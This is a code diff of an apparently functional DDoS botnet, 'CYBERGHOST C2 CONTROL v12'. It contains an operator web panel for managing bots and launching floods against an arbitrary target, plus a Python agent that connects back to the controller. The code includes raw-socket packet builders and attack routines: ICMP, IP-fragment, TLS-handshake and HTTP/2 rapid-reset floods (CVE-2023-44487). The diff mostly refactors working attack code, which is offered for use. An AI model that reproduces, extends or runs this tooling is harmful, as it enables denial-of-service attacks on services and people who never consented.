+.mbtn:hover{border-color:var(--dim)}
+.mbtn.sel{border-color:var(--fg);color:var(--fg);background:rgba(0,255,157,.1);box-shadow:var(--glow)}
+.mbtn small{display:block;color:var(--dim);font-size:8px;margin-top:2px}
+.log{height:180px;overflow-y:auto;background:#000;border:1px solid var(--line);padding:8px;font-size:10.5px;line-height:1.5;color:var(--dim)}
+.log .ok{color:var(--fg)}.log .warn{color:var(--warn)}.log .amber{color:var(--amber)}
+input[type=range]{-webkit-appearance:none;background:var(--line);height:4px;padding:0}
+input[type=range]::-webkit-slider-thumb{-webkit-appearance:none;width:14px;height:14px;background:var(--fg);border-radius:0;cursor:pointer;box-shadow:var(--glow)}
+.rangev{color:var(--fg);font-size:11px}
+.login{max-width:340px;margin:16vh auto;background:var(--panel);border:1px solid var(--line);padding:28px}
+.login h1{font-size:16px;letter-spacing:3px;margin-bottom:20px;text-align:center;text-shadow:var(--glow)}
+.login h1 b{color:var(--warn)}
+.err{color:var(--warn);font-size:11px;margin-top:8px;min-height:14px}
+.view{display:none}.view.active{display:block}
 pre{background:#000;border:1px solid var(--line);padding:10px;font-size:10.5px;color:var(--fg);overflow-x:auto}
+code{color:var(--fg)}
+::-webkit-scrollbar{width:8px;height:8px}
+::-webkit-scrollbar-track{background:var(--bg)}::-webkit-scrollbar-thumb{background:var(--line)}
 </style></head><body>
+
 <div id="loginView" class="login">
 <h1>CYBER<b>GHOST</b></h1>
 <input id="u" placeholder="username" value="ghost"/>
 <input id="p" type="password" placeholder="password"/>
 <button onclick="doLogin()">ورود</button>
-<div id="lerr" style="color:var(--warn);font-size:11px;margin-top:8px;min-height:14px"></div>
+<div id="lerr" class="err"></div>
 </div>
+
 <div id="appView" class="app" style="display:none">
 <aside class="sidebar">
 <div class="brand"><h1>CYBER<b>GHOST</b></h1><small>// C2 CONTROL v12</small></div>
@@ -1083,12 +1129,12 @@ pre{background:#000;border:1px solid var(--line);padding:10px;font-size:10.5px;c
 <input id="tgt" placeholder="target.com"/>
 <div class="mgrid" id="fullMethods"></div>
 <input id="port" placeholder="port" type="number"/>
-<label style="color:var(--dim);font-size:10px">DURATION <span id="durv">60</span>s</label>
+<label style="color:var(--dim);font-size:10px">DURATION <span class="rangev" id="durv">60</span>s</label>
 <input id="dur" type="range" min="5" max="3600" value="60" oninput="durv.textContent=this.value"/>
-<label style="color:var(--dim);font-size:10px">THREADS <span id="thrv">256</span></label>
+<label style="color:var(--dim);font-size:10px">THREADS <span class="rangev" id="thrv">256</span></label>
 <input id="thr" type="range" min="1" max="4096" value="256" oninput="thrv.textContent=this.value"/>
 <button class="fire" onclick="launch()">شلیک</button>
-<div id="aerr" style="color:var(--warn);font-size:11px"></div></div>
+<div id="aerr" class="err"></div></div>
 <div class="card"><h3>HISTORY <span id="histCount">0</span></h3>
 <table><thead><tr><th>#</th><th>target</th><th>method</th><th>status</th></tr></thead><tbody id="histTable"></tbody></table></div>
 </div></section>
@@ -1109,8 +1155,7 @@ pre{background:#000;border:1px solid var(--line);padding:10px;font-size:10.5px;c
 </tbody></table></div>
 <div class="card" style="margin-top:12px"><h3>DEPLOY</h3>
 <pre>python app.py --gen-token &lt;bot_id&gt;
-python app.py --hash-pass
-python tor.py --mode gateway</pre>
+python app.py --hash-pass</pre>
 <pre>python app.py --agent --c2 wss://server --token TOKEN --workers 4</pre>
 </div></section>
 </main>
@@ -1141,16 +1186,20 @@ let token=localStorage.getItem("cg_token")||"";
 let ws=null,selMethod="http_get";
 let rpsHistory=new Array(60).fill(0),bwHistory=new Array(60).fill(0);
 let logLines=0,pollTimer=null;
+
 async function doLogin(){
-const r=await fetch("/api/token",{method:"POST",body:new URLSearchParams({username:u.value,password:p.value})});
-if(!r.ok){document.getElementById("lerr").textContent="fail";return;}
+const r=await fetch("/api/token",{method:"POST",body:new URLSearchParams({username:document.getElementById("u").value,password:document.getElementById("p").value})});
+if(!r.ok){document.getElementById("lerr").textContent="ورود ناموفق";return;}
 token=(await r.json()).access_token;localStorage.setItem("cg_token",token);showApp();
 }
 function showApp(){
 document.getElementById("loginView").style.display="none";
 document.getElementById("appView").style.display="grid";
 buildMethodUI();openWs();poll();
-pollTimer=setInterval(poll,3000);setInterval(tickClock,1000);setInterval(drawChart,1000);
+if(pollTimer)clearInterval(pollTimer);
+pollTimer=setInterval(poll,3000);
+setInterval(tickClock,1000);tickClock();
+setInterval(drawChart,1000);drawChart();
 document.getElementById("info-endpoint").textContent=location.origin;
 }
 function buildMethodUI(){
@@ -1159,10 +1208,14 @@ const fm=document.getElementById("fullMethods");fm.innerHTML="";
 METHODS.forEach(m=>{
 const a=document.createElement("div");
 a.className="mbtn"+(m.id===selMethod?" sel":"");
-a.innerHTML=m.id+"<small>"+m.layer+"</small>";a.dataset.method=m.id;
-a.onclick=()=>{selMethod=m.id;refreshMethodSel();};fm.appendChild(a);
+a.innerHTML=m.id+"<small>"+m.layer+"</small>";
+a.dataset.method=m.id;
+a.onclick=()=>{selMethod=m.id;refreshMethodSel();};
+fm.appendChild(a);
 if(["http_get","http2_rapid","tcp_syn","dns_water"].includes(m.id)){
-const b=a.cloneNode(true);b.onclick=()=>{selMethod=m.id;refreshMethodSel();};qm.appendChild(b);
+const b=a.cloneNode(true);
+b.onclick=()=>{selMethod=m.id;refreshMethodSel();};
+qm.appendChild(b);
 }
 });
 document.getElementById("methodsTable").innerHTML=METHODS.map(m=>
@@ -1173,11 +1226,14 @@ document.querySelectorAll(".mbtn").forEach(el=>el.classList.toggle("sel",el.data
 }
 function drawChart(){
 const c=document.getElementById("chart");if(!c)return;
-const dpr=window.devicePixelRatio||1;const w=c.clientWidth,h=c.clientHeight;
+const dpr=window.devicePixelRatio||1;
+const w=c.clientWidth,h=c.clientHeight;
 if(c.width!==w*dpr||c.height!==h*dpr){c.width=w*dpr;c.height=h*dpr;}
-const ctx=c.getContext("2d");ctx.setTransform(dpr,0,0,dpr,0,0);
+const ctx=c.getContext("2d");
+ctx.setTransform(dpr,0,0,dpr,0,0);
 ctx.fillStyle="#020604";ctx.fillRect(0,0,w,h);
-ctx.strokeStyle="#0a2a1a";for(let i=0;i<=4;i++){const y=h*i/4;ctx.beginPath();ctx.moveTo(0,y);ctx.lineTo(w,y);ctx.stroke();}
+ctx.strokeStyle="#0a2a1a";ctx.lineWidth=1;
+for(let i=0;i<=4;i++){const y=h*i/4;ctx.beginPath();ctx.moveTo(0,y);ctx.lineTo(w,y);ctx.stroke();}
 const maxR=Math.max(1,...rpsHistory),maxB=Math.max(0.01,...bwHistory);
 function plot(arr,max,color){ctx.strokeStyle=color;ctx.lineWidth=2;ctx.beginPath();
 arr.forEach((v,i)=>{const x=w*i/(arr.length-1);const y=h-(v/max)*h*0.9;if(i===0)ctx.moveTo(x,y);else ctx.lineTo(x,y);});ctx.stroke();}
@@ -1189,11 +1245,16 @@ ws=new WebSocket(proto+"://"+location.host+"/ws/admin",["bearer."+token]);
 ws.onmessage=e=>{const m=JSON.parse(e.data);
 if(m.type==="bot_online")addLog("bot online: "+m.bot_id,"ok");
 if(m.type==="bot_offline")addLog("bot offline: "+m.bot_id,"warn");
-if(m.type==="attack_started"){addLog("attack #"+m.attack_id+" → "+m.target,"warn");poll();}
+if(m.type==="attack_started"){addLog("ATTACK #"+m.attack_id+" → "+m.target+" ["+m.method+"]","warn");poll();}
 if(m.type==="attack_finished"){addLog("attack #"+m.attack_id+" finished","ok");poll();}
-if(m.type==="stats"){rpsHistory.push(m.requests);rpsHistory.shift();bwHistory.push(m.bytes/1024/1024);bwHistory.shift();
-document.getElementById("bw-label").textContent=bwHistory.reduce((a,b)=>a+b,0).toFixed(1)+" MB/s";
-document.getElementById("s-rps").textContent=rpsHistory.reduce((a,b)=>a+b,0);}
+if(m.type==="attack_stopped"){addLog("attack #"+m.attack_id+" stopped","amber");poll();}
+if(m.type==="stats"){
+rpsHistory.push(m.requests);rpsHistory.shift();
+bwHistory.push(m.bytes/1024/1024);bwHistory.shift();
+const bw=bwHistory.reduce((a,b)=>a+b,0).toFixed(1);
+document.getElementById("bw-label").textContent=bw+" MB/s";
+document.getElementById("s-rps").textContent=rpsHistory.reduce((a,b)=>a+b,0);
+}
 };
 ws.onclose=()=>setTimeout(openWs,2000);
 }
@@ -1201,30 +1262,50 @@ async function poll(){await loadStats();await loadBots();await loadAttacks();}
 async function loadStats(){
 const r=await fetch("/api/stats",{headers:{Authorization:"Bearer "+token}});
 if(r.status===401){localStorage.removeItem("cg_token");location.reload();return;}
-if(!r.ok)return;const s=await r.json();
+if(!r.ok)return;
+const s=await r.json();
 document.getElementById("s-online").textContent=s.bots_online;
 document.getElementById("s-total").textContent=s.bots_total;
 document.getElementById("s-att").textContent=s.attacks_running;
-if(s.proxy){document.getElementById("s-proxy").textContent=s.proxy.healthy+"/"+s.proxy.total;
+if(s.proxy){
+document.getElementById("s-proxy").textContent=s.proxy.healthy+"/"+s.proxy.total;
 document.getElementById("proxyStat").textContent=s.proxy.healthy+"/"+s.proxy.total;
 document.getElementById("px-total").textContent=s.proxy.total;
 document.getElementById("px-healthy").textContent=s.proxy.healthy;
-document.getElementById("px-tor").textContent=s.tor?"enabled":"disabled";}
+document.getElementById("px-tor").textContent=s.tor?"enabled":"disabled";
+}
 }
 async function loadBots(){
 const r=await fetch("/api/bots",{headers:{Authorization:"Bearer "+token}});
-if(!r.ok)return;const bots=await r.json();
+if(!r.ok)return;
+const bots=await r.json();
 document.getElementById("botCount").textContent=bots.length;
-document.getElementById("botsTable").innerHTML=bots.map(b=>'<tr><td style="color:var(--fg)">'+b.bot_id.slice(0,12)+'</td><td>'+b.hostname+'</td><td>'+b.ip+'</td><td>'+b.os+'</td><td>'+b.arch+'</td><td>'+b.cpu_cores+'</td><td>'+b.ram_mb+'MB</td><td>'+(b.agent_version||"?")+'</td><td style="color:var(--dim)">'+(b.capabilities||"—")+'</td><td style="color:var(--dim)">'+new Date(b.last_seen*1000).toLocaleTimeString()+'</td><td><span class="dot '+(b.connected?'on':'')+'"></span>'+(b.connected?'online':'offline')+'</td><td><button class="kill" onclick="killBot(\''+b.bot_id+'\')" style="border-color:var(--warn);color:var(--warn);padding:4px 8px;font-size:10px;width:auto">kill</button></td></tr>').join("");
+document.getElementById("botsTable").innerHTML=bots.map(b=>'<tr>'+
+'<td style="color:var(--fg)">'+b.bot_id.slice(0,12)+'</td>'+
+'<td>'+b.hostname+'</td><td>'+b.ip+'</td><td>'+b.os+'</td><td>'+b.arch+'</td>'+
+'<td>'+b.cpu_cores+'</td><td>'+b.ram_mb+'MB</td><td>'+(b.agent_version||"?")+'</td>'+
+'<td style="color:var(--dim)">'+(b.capabilities||"—")+'</td>'+
+'<td style="color:var(--dim)">'+new Date(b.last_seen*1000).toLocaleTimeString()+'</td>'+
+'<td><span class="dot '+(b.connected?'on':'')+'"></span>'+(b.connected?'online':'offline')+'</td>'+
+'<td><button class="kill" onclick="killBot(\''+b.bot_id+'\')">kill</button></td></tr>').join("");
 }
 async function loadAttacks(){
 const r=await fetch("/api/attacks",{headers:{Authorization:"Bearer "+token}});
-if(!r.ok)return;const atts=await r.json();
+if(!r.ok)return;
+const atts=await r.json();
 const running=atts.filter(a=>a.status==="running");
 document.getElementById("activeCount").textContent=running.length;
 document.getElementById("histCount").textContent=atts.length;
-document.getElementById("dashAttacks").innerHTML=running.map(a=>'<tr><td style="color:var(--warn)">'+a.id+'</td><td>'+a.target+'</td><td>'+a.method+'</td><td>'+a.assigned_bots+'</td><td>'+a.requests_sent+'</td><td>'+(a.bytes_sent/1024/1024).toFixed(2)+'MB</td><td style="color:var(--warn)">running</td><td><button onclick="stopAttack('+a.id+')" style="border-color:var(--amber);color:var(--amber);padding:4px 8px;font-size:10px;width:auto">stop</button></td></tr>').join("")||'<tr><td colspan="8" style="color:var(--dim);text-align:center">no active</td></tr>';
-document.getElementById("histTable").innerHTML=atts.slice(0,30).map(a=>'<tr><td>'+a.id+'</td><td>'+a.target+'</td><td>'+a.method+'</td><td style="color:'+(a.status==='running'?'var(--warn)':'var(--dim)')+'">'+a.status+'</td></tr>').join("");
+document.getElementById("dashAttacks").innerHTML=running.map(a=>'<tr>'+
+'<td style="color:var(--warn)">'+a.id+'</td><td>'+a.target+'</td><td>'+a.method+'</td>'+
+'<td>'+a.assigned_bots+'</td><td>'+a.requests_sent+'</td>'+
+'<td>'+(a.bytes_sent/1024/1024).toFixed(2)+'MB</td>'+
+'<td style="color:var(--warn)">running</td>'+
+'<td><button class="stop" onclick="stopAttack('+a.id+')">stop</button></td></tr>').join("")||
+'<tr><td colspan="8" style="color:var(--dim);text-align:center">no active</td></tr>';
+document.getElementById("histTable").innerHTML=atts.slice(0,30).map(a=>'<tr>'+
+'<td>'+a.id+'</td><td>'+a.target+'</td><td>'+a.method+'</td>'+
+'<td style="color:'+(a.status==='running'?'var(--warn)':'var(--dim)')+'">'+a.status+'</td></tr>').join("");
 }
 async function launch(){
 document.getElementById("aerr").textContent="";
@@ -1232,35 +1313,54 @@ const target=document.getElementById("tgt").value.trim();
 const port=parseInt(document.getElementById("port").value||"0");
 const duration=parseInt(document.getElementById("dur").value);
 const threads=parseInt(document.getElementById("thr").value);
-if(!target){document.getElementById("aerr").textContent="kosong";return;}
-const r=await fetch("/api/attack",{method:"POST",headers:{"Content-Type":"application/json",Authorization:"Bearer "+token},
+if(!target){document.getElementById("aerr").textContent="target kosong";return;}
+const r=await fetch("/api/attack",{method:"POST",
+headers:{"Content-Type":"application/json",Authorization:"Bearer "+token},
 body:JSON.stringify({target,method:selMethod,port,duration,threads})});
-if(!r.ok){document.getElementById("aerr").textContent="err: "+(await r.text());return;}
-const j=await r.json();addLog("dispatched #"+j.attack_id,"warn");poll();
+if(!r.ok){document.getElementById("aerr").textContent="error: "+(await r.text());return;}
+const j=await r.json();
+addLog("dispatched attack #"+j.attack_id+" → "+j.assigned_bots+" bots","warn");
+poll();
 }
 async function quickFire(){
 const target=document.getElementById("qt").value.trim();if(!target)return;
-const r=await fetch("/api/attack",{method:"POST",headers:{"Content-Type":"application/json",Authorization:"Bearer "+token},
+const r=await fetch("/api/attack",{method:"POST",
+headers:{"Content-Type":"application/json",Authorization:"Bearer "+token},
 body:JSON.stringify({target,method:selMethod,port:0,duration:60,threads:256})});
-if(r.ok){const j=await r.json();addLog("quick #"+j.attack_id,"warn");poll();}
+if(r.ok){const j=await r.json();addLog("quick fire #"+j.attack_id,"warn");poll();}
+else addLog("quick fire err: "+(await r.text()),"warn");
 }
 async function stopAttack(aid){
-await fetch("/api/attack/"+aid+"/stop",{method:"POST",headers:{Authorization:"Bearer "+token}});poll();
+const r=await fetch("/api/attack/"+aid+"/stop",{method:"POST",headers:{Authorization:"Bearer "+token}});
+if(r.ok)addLog("attack #"+aid+" stopped","amber");poll();
 }
 async function killBot(bid){
-await fetch("/api/bot/"+bid+"/kill",{method:"POST",headers:{Authorization:"Bearer "+token}});
+const r=await fetch("/api/bot/"+bid+"/kill",{method:"POST",headers:{Authorization:"Bearer "+token}});
+if(r.ok)addLog("kill → "+bid,"warn");
 }
-document.querySelectorAll(".nav a").forEach(a=>{a.onclick=e=>{e.preventDefault();
-document.querySelectorAll(".nav a").forEach(x=>x.classList.remove("active"));a.classList.add("active");
-const v=a.dataset.view;document.querySelectorAll(".view").forEach(s=>s.classList.remove("active"));
-document.getElementById("view-"+v).classList.add("active");
-document.getElementById("viewTitle").textContent=a.textContent.trim();};});
-function addLog(msg,cls){cls=cls||"";const l=document.getElementById("log");if(!l)return;
+document.querySelectorAll(".nav a").forEach(a=>{
+a.onclick=e=>{
+e.preventDefault();
+document.querySelectorAll(".nav a").forEach(x=>x.classList.remove("active"));
+a.classList.add("active");
+const v=a.dataset.view;
+document.querySelectorAll(".view").forEach(s=>s.classList.remove("active"));
+const view=document.getElementById("view-"+v);if(view)view.classList.add("active");
+document.getElementById("viewTitle").textContent=a.textContent.trim();
+};
+});
+function addLog(msg,cls){
+cls=cls||"";
+const l=document.getElementById("log");if(!l)return;
 l.innerHTML+='<div class="'+cls+'">['+new Date().toLocaleTimeString()+'] '+msg+'</div>';
-logLines++;document.getElementById("logCount").textContent=logLines;l.scrollTop=l.scrollHeight;}
+logLines++;const lc=document.getElementById("logCount");if(lc)lc.textContent=logLines;
+l.scrollTop=l.scrollHeight;
+}
 function tickClock(){document.getElementById("clock").textContent=new Date().toLocaleTimeString();}
 if(token)showApp();
-</script></body></html>
+</script>
+</body>
+</html>
 """
 
 # ============================================================
@@ -1309,7 +1409,8 @@ def csum16(data):
     s = 0
     for i in range(0, len(data), 2):
         s += (data[i] << 8) + data[i+1]
-    s = (s >> 16) + (s & 0xFFFF); s += (s >> 16)
+    s = (s >> 16) + (s & 0xFFFF)
+    s += (s >> 16)
     return (~s) & 0xFFFF
 
 def build_ip_tcp(src_ip, dst_ip, src_port, dst_port, flags, seq, ack=0, payload=b""):
@@ -1344,7 +1445,8 @@ def build_ip_frag(src_ip, dst_ip, proto, payload, offset, mf=True):
 def raw_socket_tcp():
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
-        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1); return s
+        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+        return s
     except PermissionError: return None
 
 def raw_socket_icmp():
@@ -1354,17 +1456,20 @@ def raw_socket_icmp():
 class StatsSender:
     def __init__(self, ws, attack_id):
         self.ws = ws; self.attack_id = attack_id
-        self.q = asyncio.Queue(maxsize=128); self.dead = False
+        self.q: asyncio.Queue = asyncio.Queue(maxsize=128)
+        self.dead = False
         self.task = asyncio.create_task(self._run())
     async def send(self, r, b):
-        if self.dead or (r == 0 and b == 0): return
+        if self.dead: return
+        if r == 0 and b == 0: return
         try: self.q.put_nowait((r, b))
         except asyncio.QueueFull: pass
     async def _run(self):
         try:
             while True:
                 r, b = await self.q.get()
-                try: await self.ws.send(json.dumps({"type":"stats","attack_id":self.attack_id,"requests":r,"bytes":b}))
+                try:
+                    await self.ws.send(json.dumps({"type":"stats","attack_id":self.attack_id,"requests":r,"bytes":b}))
                 except Exception:
                     self.dead = True
                     while not self.q.empty():
@@ -1392,7 +1497,8 @@ async def icmp_flood(ctx):
     tasks = [asyncio.create_task(one()) for _ in range(min(ctx["threads"],128))]
     while time.time() < deadline:
         await asyncio.sleep(1); await ctx["on_stats"](stats["r"],stats["b"]); stats["r"]=0; stats["b"]=0
-    for t in tasks: t.cancel(); sock.close()
+    for t in tasks: t.cancel()
+    sock.close()
 
 async def ip_fragment(ctx):
     ip, host = resolve_host(ctx["target"]); loop = asyncio.get_running_loop()
@@ -1540,7 +1646,6 @@ async def tls_handshake(ctx):
     for t in tasks: t.cancel()
 
 async def tls_reneg(ctx):
-    # TLS 1.3 removed renegotiation — fresh-handshake flood with no ticket
     ip, host = resolve_host(ctx["target"]); port = ctx["port"] or 443
     deadline = time.time()+ctx["duration"]; stats = {"r":0}
     async def one():
@@ -1695,7 +1800,6 @@ async def http_post(c): await _http_attack(c, "post")
 async def http_rand(c): await _http_attack(c, "rand")
 
 async def http2_rapid(ctx):
-    # CVE-2023-44487 patched in nginx 1.25.3+, Cloudflare, Google, Akamai, AWS
     if not H2_OK: return await http_get(ctx)
     ip, host = resolve_host(ctx["target"]); port = ctx["port"] or 443
     deadline = time.time()+ctx["duration"]; stats = {"r":0,"b":0}
@@ -1827,7 +1931,9 @@ class Agent:
     def __init__(self, c2, token):
         self.c2 = c2.rstrip("/"); self.token = token
         self.bot_id = hashlib.sha256((platform.node() + platform.machine()).encode()).hexdigest()[:16]
-        self.tasks = {}; self.senders = {}; self.killed = False
+        self.tasks: Dict[int, asyncio.Task] = {}
+        self.senders: Dict[int, StatsSender] = {}
+        self.killed = False
 
     async def connect_loop(self):
         if not WS_AVAILABLE:
@@ -1835,7 +1941,8 @@ class Agent:
         if self.c2.startswith("ws://") and not ALLOW_PLAINTEXT_AGENT:
             log.error("plaintext ws:// rejected"); return
         backoff = 3
-        ws_url = self.c2.replace("https://","wss://").replace("http://","ws://") + "/ws/bot/" + self.bot_id
+        ws_url = self.c2.replace("https://","wss://").replace("http://","ws://")
+        ws_url += "/ws/bot/" + self.bot_id
         headers = {"x-agent-token": self.token}
         while not self.killed:
             try:
@@ -1951,11 +2058,13 @@ def do_check():
     if JWT_SECRET.startswith("change-me"): print("[!] JWT_SECRET default"); ok = False
     if not ADMIN_HASH and not ADMIN_PASS: print("[!] ADMIN creds empty"); ok = False
     if AGENT_SECRET.startswith("change-me"): print("[!] AGENT_SECRET default"); ok = False
-    if REQUIRE_TLS and not (C2_TLS_CERT and C2_TLS_KEY): print("[!] TLS required"); ok = False
+    if REQUIRE_TLS and not (C2_TLS_CERT and C2_TLS_KEY): print("[!] TLS required but no cert/key"); ok = False
     if not WS_AVAILABLE: print("[!] websockets missing"); ok = False
     if not AIOHTTP_SOCKS_OK and not CURL_CFFI_OK: print("[!] no proxy lib"); ok = False
-    try: import fastapi, uvicorn, aiosqlite, jose, passlib
-    except ImportError as e: print("[!] missing: %s" % e); ok = False
+    try:
+        import fastapi, uvicorn, aiosqlite, jose, passlib  # noqa
+    except ImportError as e:
+        print("[!] missing dep: %s" % e); ok = False
     print("[+] check %s" % ("OK" if ok else "FAILED"))
     return ok
 
@@ -1985,8 +2094,5 @@ if __name__ == "__main__":
             print("error: --token required", file=sys.stderr); sys.exit(1)
         run_agent(args.c2, args.token, args.workers)
     else:
-        # pass import-string "app:app" ke uvicorn supaya workers>1 & reload work.
         import uvicorn
-        uvicorn.run("app:app", host=C2_HOST, port=C2_PORT,
-                    workers=args.workers, log_level="info")
-        
+        uvicorn.run("app:app", host=C2_HOST, port=C2_PORT, workers=args.workers, log_level="info")
